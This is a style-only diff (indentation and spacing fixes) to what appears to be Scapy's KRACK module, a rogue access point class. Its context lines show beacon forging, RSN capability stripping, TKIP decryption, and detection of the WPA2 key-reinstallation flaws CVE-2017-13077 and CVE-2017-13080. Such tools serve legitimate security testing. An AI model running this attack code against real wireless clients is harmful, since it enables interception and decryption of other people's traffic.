@@ -154,7 +154,7 @@ class KrackAP(Automaton):
 
     def run(self, *args, **kwargs):
         log_runtime.warning("AP started with ESSID: %s, BSSID: %s",
-                         self.ssid, self.mac)
+                            self.ssid, self.mac)
         super(KrackAP, self).run(*args, **kwargs)
 
     # Key utils
@@ -219,17 +219,17 @@ class KrackAP(Automaton):
         For beacon / proberesp use
         """
         return RadioTap() \
-              / Dot11(addr1=dest, addr2=self.mac, addr3=self.mac) \
-              / layer_cls(timestamp=0, beacon_interval=100,
-                          cap='ESS+privacy') \
-              / Dot11Elt(ID="SSID", info=self.ssid) \
-              / Dot11Elt(ID="Rates", info=b'\x82\x84\x8b\x96\x0c\x12\x18$') \
-              / Dot11Elt(ID="DSset", info=chb(self.channel)) \
-              / Dot11Elt(
-                  ID="RSNinfo",
-                  info=b'\x01\x00\x00\x0f\xac\x02\x01\x00\x00\x0f\xac\x02'\
-                  b'\x01\x00\x00\x0f\xac\x02\x00\x00'
-              )
+            / Dot11(addr1=dest, addr2=self.mac, addr3=self.mac) \
+            / layer_cls(timestamp=0, beacon_interval=100,
+                        cap='ESS+privacy') \
+            / Dot11Elt(ID="SSID", info=self.ssid) \
+            / Dot11Elt(ID="Rates", info=b'\x82\x84\x8b\x96\x0c\x12\x18$') \
+            / Dot11Elt(ID="DSset", info=chb(self.channel)) \
+            / Dot11Elt(
+            ID="RSNinfo",
+            info=b'\x01\x00\x00\x0f\xac\x02\x01\x00\x00\x0f\xac\x02'\
+            b'\x01\x00\x00\x0f\xac\x02\x00\x00'
+        )
 
     @staticmethod
     def build_EAPOL_Key_8021X2004(
@@ -373,7 +373,7 @@ class KrackAP(Automaton):
         # Send to DHCP server
         # LLC / SNAP to Ether
         if SNAP in pkt:
-            ether_pkt = Ether(src=self.client,dst=self.mac) / pkt[SNAP].payload
+            ether_pkt = Ether(src=self.client, dst=self.mac) / pkt[SNAP].payload
             self.dhcp_server.reply(ether_pkt)
 
         # If an ARP request is made, extract client IP and answer
@@ -505,7 +505,7 @@ class KrackAP(Automaton):
     def send_assoc_response(self, pkt):
 
         # Get RSN info
-        temp_pkt = pkt[Dot11Elt::{"ID":48}].copy()
+        temp_pkt = pkt[Dot11Elt::{"ID": 48}].copy()
         temp_pkt.remove_payload()
         self.RSN = raw(temp_pkt)
         # Avoid 802.11w, etc. (deactivate RSN capabilities)
@@ -696,7 +696,7 @@ class KrackAP(Automaton):
         # Get IV
         TSC, _, _ = parse_TKIP_hdr(pkt)
         iv = TSC[0] | (TSC[1] << 8) | (TSC[2] << 16) | (TSC[3] << 24) | \
-             (TSC[4] << 32) | (TSC[5] << 40)
+            (TSC[4] << 32) | (TSC[5] << 40)
         log_runtime.info("Got a packet with IV: %s", hex(iv))
 
         if self.last_iv is None:
@@ -706,7 +706,7 @@ class KrackAP(Automaton):
                 log_runtime.warning("IV re-use!! Client seems to be "
                                     "vulnerable to handshake 3/4 replay "
                                     "(CVE-2017-13077)"
-                )
+                                    )
 
         data_clear = None
 
@@ -740,7 +740,6 @@ class KrackAP(Automaton):
         pkt = LLC(data_clear)
         log_runtime.debug(repr(pkt))
         self.deal_common_pkt(pkt)
-
 
     @ATMT.condition(RENEW_GTK)
     def gtk_pkt_1(self):
@@ -830,7 +829,7 @@ class KrackAP(Automaton):
                 self.arp_to_send = 0
                 self.arp_retry += 1
                 log_runtime.info("Trying to trigger CVE-2017-13080 %d/%d",
-                              self.arp_retry, self.ARP_MAX_RETRY)
+                                 self.arp_retry, self.ARP_MAX_RETRY)
                 if self.arp_retry > self.ARP_MAX_RETRY:
                     # We retries 100 times to send GTK, then already sent ARPs
                     log_runtime.warning("Client is likely not vulnerable to "
